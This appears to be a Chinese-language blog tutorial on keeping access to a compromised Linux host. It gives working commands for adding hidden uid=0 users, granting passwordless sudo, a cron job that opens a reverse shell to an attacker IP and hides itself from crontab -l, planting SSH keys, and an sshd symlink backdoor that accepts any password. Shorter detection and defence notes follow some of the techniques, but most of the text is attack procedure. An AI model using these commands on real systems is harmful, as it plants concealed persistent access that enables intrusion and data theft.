
![Image](https://mmbiz.qpic.cn/sz_mmbiz_gif/dhzGXdxNSYu9NHeLQtcv3btw1zjO4LfzWI3eeGE0fkD9CaQEgDh4FHsKYk8iaVOjhRgGKfEbfRwZf64QibNxEmWg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)


前言

      在渗透过程中拿到目标权限只是开始，通常会留下后门以便再次访问（简称APT）。所以需要进行权限维持，隐藏后门。常见的Linux后门有cron后门、ssh后门、vim后门、隐藏文件、添加超级用户、alias后门等等，本文将对Linux下常见的权限维持后门技术进行解析。

# 添加用户

## 添加uid=0的用户

1.  创建用户，并修改/etc/passwd文件

```
useradd tide;echo 'tide:123456' | chpasswd    # 创建用户tide并修改密码为123456
```

```
vi /etc/passwd           # 修改passwd文件，将tide用户的uid改为0
```

改动前：

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0dEricfWKkJRegfgSubibWv5ibYYcnibgSAPh9vkbWJpFt2UkPqylBFacEQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

改动后：

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0wlPHZ7VqP3Evw2XOYmKx6tzHlDgP2oiaGibMBgqrY4Za9vEA8q2Ycp3A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**攻击端：**
**ssh tide@被控端ip -p 端口**

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0bbtaOOauYtathf1zw5ZXfUm4ibBPhabPYtjHrIHic9NqbhORibFRQKjnw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

2.  使用useradd -p方法，通过 \` \` 存放可执行的系统命令添加uid=0的用户；
```
useradd -p `openssl passwd -1 -salt 'salt' 123456` chiyu -o -u 0 -g root -G root -s /bin/bash -d /home/chiyu
```

## 添加普通用户

```
1.useradd -p `openssl passwd -1 -salt 'salt' 123456` chiyu
```

	使用useradd-p方法，通过 \` \` 存放可执行的系统命令；
	创建一个用户名为chiyu，密码为123456的普通用户；

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0NibYEQEQY6OQNmTNg5fDcm7IjCWP8ibWH2Xrgg2GdCSv46DvJzR2dQ8w/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

攻击端使用chiyu连接（以下就不一一示范了）

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0Lia0nJg2icNA7k0Xynes1JTFd9cJNFuAXU6G8lrojY3xEK4sA5nlicrQQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

	使用useradd -p方法，通过 "$()" 存放可执行的系统命令添加用户;

```
2.useradd -p "$(openssl passwd -1 123456)" chiyu
```

	chpasswd方法添加用户;

```
3.useradd chiyu;echo 'chiyu:123456'|chpasswd
```

	echo -e方法添加用户;

```
4.useradd chiyu;echo -e "123456\n123456\n" |passwd chiyu
```

## 检测

```
awk -F: '$3==0{print $1}' /etc/passwd
```

\# 查询特权用户（uid=0的用户）

```
awk -F: '$3==0{print $1}' /etc/passwd
```

\# 查询可以远程登录的账户信息

```
more /etc/sudoers | grep -v "^#\|^$" | grep "ALL=(ALL)"
```

\# 查询除root账户外，其他存在sudo权限的账户（如非管理需要，普通账号应删除sudo权限）

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0uywL28DmhvK6LicqZ0TKxPgnUKyoYiccc5R8uqIqXNScGl3szWPHZchw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

# /etc/sudoers利用

## 原理

     /etc/sudoers文件是sudo的配置文件，是管理员集中的管理用户的使用权限和使用的主机。当用户执行sudo命令时，系统会主动寻找/etc/sudoers文件，判断该用户是否有执行sudo的权限，若确认用户具有可执行sudo的权限后，让用户输入密码在进行确认，但是root用户执行sudo时不需要输入密码，所以可利用此文件进行配置允许特定用户在不用输入root密码的情况下使用所有命令。

## 实例

**被控端：**

1.  新建用户
![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0KfYqpfMfkkIWAxibsqN5Kc0ZdnEbIC08S3NIGqJC72hM4iapYJnbwS5g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

2.  修改文件：
使用vim /etc/sudoers  修改，或者用visudo进行编辑此文件，visudo命令可在退出时，自动检测语法错误。
增加一条内容，如下图：
![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF00LJBibnpIWnqiaMlwBuUgLgctLBF2MMc48x3jHxlEl5vYw6m3ibGktxHw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

\# 此行的含义：普通用户kali可以通过sudo这个命令，免密码以任何用户的身份执行任何命令，kali是要提权的普通用户。第一个ALL，这个规则对所有的host生效，等号右边括号的root（也可以换成ALL），是指kali可以执行root用户权限的命令，第三个ALL是可以执行所有命令。

**攻击端：**
ssh kali@被控端ip -p 端口
![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0RYYmLvdPQKgXE6AcldU3bLc8DwMbTv72Bx0K10eoJlzicwLq8o6ujQQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

# cron后门

## 原理

     crontab命令用于定期执行某些设定好的任务，crond命令每分钟都会定期检查是否有要执行的任务，如果有便会自动执行该任务。若创建新的cron任务，并不会马上执行，一般过2分钟后才能够执行，或者可以重启cron马上执行。
    crontab -l命令用于查看定时任务，实际是查看/var/spool/cron/crontabs/root文件（每个用户都会生成一个与自己同名的crontab文件位于/var/spool/cron/crontabs/中），而通过建立隐藏后门的文件，再执行crontab -l或者直接使用cat命令去查看crontabs目录的文件，就无法看见真正执行的定时任务。

## 实例

**被控端：**

```
1.crontab -l     # 查看定时任务
```

```
2.植入crontab隐藏后门需要的文件first.sh，vim first.sh，文件内容如下：
\#! /bin/bash
bash -I >& /dev/tcp/攻击端ip/监听端口 0>&1
（反弹shell到攻击端）
```

```
3.建立cron隐藏后门second.sh文件，vim second.sh，文件内容如下：
(crontab -l;printf "*/1 * * * * /root/first.sh;\rno crontab for `whoami`%100c\n")|crontab -
```

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0k15f0fffaMd3VjTts67B4JlsyCB8XFh7ahlU9Bkq2HKvdqfnWZPChA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

```
4.更改文件权限
chmod 777 first.sh
chmod 777 second.sh
攻击端：
nc -l 监听端口     # 开启监听
被控端：
crontab -l       # 查看定时任务
./second.sh     # 执行隐藏后门文件，一分钟后攻击端监听的1234端口就会接收到shell
```

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0b8poFgeXhweicg7KARfjqpKbibib1a5Ul0duIM4wcUPUMnKdDrgSab7WQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

攻击端监听：
![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF03BqHZQm9qR6ia0xnpgyOIMDkvqNWuAOdjTWA2muicPfPCiaicCxNBuvQGA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

## 检测

**被控端：**

这种后门方式，无法直接使用cat命令查看cron文件，可以使用cat -A参数查看，或者通过vim命令，vim /var/spool/cron/crontabs/root发现定时任务，如下图：

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0qTGJJZU8eEyth2doRFx9ibgPxzlbdO0dFyeBUfd627tEXzDA92z5zfg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

cat /var/spool/cron/crontabs/root
![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF08yAm3LmrlUd1mDmcEKqqqtHzibbia2uCVicguiaQwMP8Eg60cdZrZToiboA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

或者crontab -e ，查看真实的计划任务

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF055tS3HiaCESNJB7iak7j1NsNOdn9ibK009qfeouFW1slkjyOibddiaLWHHw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

执行crontab -r命令删除crontab文件，但需要注意的是，当前使用的是什么用户执行完该命令就会删除对应账号的crontab文件，并且普通用户一般没有权限访问/var/spool/cron。

## 防御

```
1.在/etc/cron.allow中设置，采用白名单，只允许某个账号使用crontab命令；

2.cron每分钟都会读取一次/etc/crontab与/var/spool/cron文件内容，所以要
时常注意这些文件；
```

## 探究

```
(crontab -l;printf "*/1 * * * * /root/first.sh;\rno crontab for `whoami`%100c\n")|crontab -
```

```
*/1 * * * *：每隔1分钟执行一次；
/r：cat默认支持 \r 回车符 \n 换行符 \f 换页符这些符号，会导致显示截断隐藏命令，隐藏真实的计划任务；
%100c：格式化输出一个字符，前面99个空格补齐。使用空格帮助我们把前面的内容在 crontab 中遮盖掉；
如果想让创建的文件隐蔽性更强，可以创建名为".."、“...”或以..等开头的
```


# ssh后门

## ssh公钥免密登录

### 效果

在攻击端生成密钥对，将公钥复制到被控端~/.ssh/authorized_keys文件，并设置相应的权限，即可免密码登录被控端。

### 实例

攻击端：
	ssh -keygen -b 4096 -t rsa       # 创建密钥对，生成id\_rsa和id\_rsa.pub文件
![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0ryp0wyggj3hQBiaru3GL6Cia2D2FPaBoBWnUZ1D4W9xCKJm7yzsUyCGw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**被控端：**
	mkdir ~/.ssh    # 创建.ssh文件夹

**攻击端：**
	ssh-copy-id -p 端口 root@被控端ip     # 将攻击端的公钥发送给被控端
![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0jo7Azu2WPK3nmaWmDFicFKZibgo1ySmkibuQEnr58USTzFPfGQUBfugFw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

攻击端ssh无密码登录
![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF03zqUOUE4Via0aYxvXH8yXSJBbkebb49GrqGtQicLDNHXia9oc3r4TjblQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

### 检测防御
	删除～/.ssh/authorized\_keys即可。

## ssh软链接

### 效果
	对sshd建立软链接，可使用任意密码登录。
### 命令

**被控端：**
```
ln -sf /usr/sbin/sshd /路径名/su;/路径名/su -oport=端口号
```

命令解释：
	ln参数 源文件 目标文件
	\-s：创建软链接；
	\-f：链接时先将与目标文件同名的文件删除；

**攻击端****：**
	ssh 用户名@目标主机IP -p 端口号
### 原理
	sshd服务启用PAM认证机制（在/etc/ssh/sshd_config文件中，设置UsePAM为yes），如果不启用PAM，系统会严格验证用户密码，就无法使用sshd软链接后门。
### 实例

**被控端：**
```
ln –sf /usr/sbin/sshd /usr/local/su;/usr/local/su –pport=6666
```

**攻击端：**
	ssh root@目标主机ip -p 6666  
	之后随便输入密码即可连接
![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF08vjm3r4vmLl9knh9ocic1Gcialq2mRyEFqUO4KVk5aqFKZfNMxjZNia0g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

	若root用户被禁止远程登录，可直接使用其他普通用户登录，密码任写。
![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0ibeY6ht4kic2pMymSeaaxZSsa91ia0ePYJ0kTcCbFOVlNTfXPVk61bYHw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

### 优点
	root被禁止登录，可以用其他用户登录。
### 缺点
	隐蔽性很弱，一般的rookit hunter这类的防护脚本可扫描到。
### 探究

1.  不建立软链接，直接启动/usr/sbin/sshd是否可以任意密码登录？
	被控端：/usr/sbin/sshd –oPort=1212
	攻击端：ssh root@ip –p 1212

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0vn8jnkur5pgcSUSp5EpbQRopRvUK4udKORdvQmEneAQqGILar2AIMw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

<font color="[[red]]"><b>连接失败</b></font>，因为默认使用/etc/pam.d/sshd的PAM配置文件，所以不能建立任意密码登录的后门。

2.  不允许PAM认证，对后门是否有影响？
	被控端：将/etc/ssh/sshd\_config文件中UsePAM的值改为no。

```
ln –sf /usr/sbin/sshd /tmp/su;/tmp/su –oPort=2222
```

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF05a95ej6Jmibu7k8PibnXBIcyPdn8lTjadNaWV6lYIfy1g2lWqictH61Bw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0Rpic0YY7k1wq5TgQU0G5qY26ZHSB6FSxpYHXkUVENRutu8EibHY8xFmA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

<font color="red"><b>连接失败</b></font>，因为默认使用/etc/pam.d/sshd的PAM配置文件，所以不能建立任意密码登录的后门。

3.  软链接的路径、文件名是否对后门有影响?
	（1）改变链接的路径：

```
被控端：ln –sf /usr/sbin/sshd /tmp/su;/tmp/su –oPort=1234
```

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0GGAt2qnGpq5pJkDEwbRzYCUtWQnmlJe8qkEC31Qf9FlN9qQ5BRnKVw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

<font color="green"><b>连接成功</b></font>，说明软链接的路径与后门功能无关联；

	（2）改变链接的文件名：

```
被控端：ln –sf /usr/sbin/sshd /usr/local/tmp; /usr/local/tmp –oPort=2345
```

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF03bJfeZxmee9f2UFmnQ9FHU8puBvPbLS561SQEE3jiaSYX9fsbwLTjPw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)
<font color="red"><b>连接失败</b></font>，说明软链接的文件名会影响后门功能。

     如果直接启动/usr/sbin/sshd，系统默认会使用/etc/pam.d/sshd目录中的PAM的配置文件，而通过建立软链接的方式，PAM认证实际上是通过软链接定义的文件名（如/usr/local/su）,在/etc/pam.d目录中去寻找对应的PAM配置文件（如/etc/pam.d/su）。

     任意密码登录的核心是suth sufficient pam_rootok.so配置，除了su文件可成功利用，/etc/pam.d目录中只要PAM配置文件中包含此项配置，就可以SSH任意密码登录（比如我的系统除了su还有chfn、chsh、runuser）。

```
find /etc/pam.d | xargs grep “pam_rootok.so”，查看包含此项配置的文件。
```

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF07EJDj6wy2IbKTZ1nic54tib4PmFRPYRCWj9oRjLbPwNca83qOMs5szvw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

或者不用系统原有的PAM配置文件，可以自己写一个。
**被控端：**
```
echo "auth sufficient pam_rootok.so" >> /etc/pam.d/chiyu
```

```
cat /etc/pam.d/chiyu
```

```
ln –sf /usr/sbin/sshd /usr/local/chiyu;/usr/local/chiyu –oPort=9999
```

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0oo1mN9k1Awh6m70DQqrF9kFP4gdHrQiciaD4l4XwaylPia3KMUwUMYCqg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

### 检测防御

1.  查看/etc/pam.d目录中有哪些文件包含auth sufficient pam_rootok.so配置；

```
find /etc/pam.d | xargs grep "pam_rootok.so"
```

2.  找到这些文件的异常端口和进程，杀死可疑进程；

```
netstat –anplt | grep –E "su | chfn | chsh | runuser"
```

```
ps –aux | grep PID号
```

```
kill -9 PID号
```

3.  找到创建的软链接文件进行删除；

```
ls -il
```

```
rm -rf 文件名
```

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0U3eHJtDcQOTZDpW2Su9aJyx23oMicda7YbMI1H0598l0tibVPUeWwmjA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0PFuG1Jfia4bp1GicurYLHNZKjfugnh8qeyf8S3bBHAfxrpaS5kJ49hVA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

4\. 关闭PAM认证；

![Image](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXiaic3hEvJiaWhK36LuLCevF0uSPl61TUiajlOM5NpenoPsDWSelAeOcGITCx2RmdKRWsBLicg2yhzicGQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

# 参考链接

https://mp.weixin.qq.com/s/0Tp6-Lddy_VyLB4AqXsw1Q
https://blog.csdn.net/weixin\_39682897/article/details/116863255
https://www.jianshu.com/p/59d1f1803421?utm\_campaign=haruki
https://cloud.tencent.com/developer/article/1683265?from=information.detail.%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%95%99%E9%9A%90%E8%94%BD%E5%90%8E%E9%97%A8

![Minion](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)
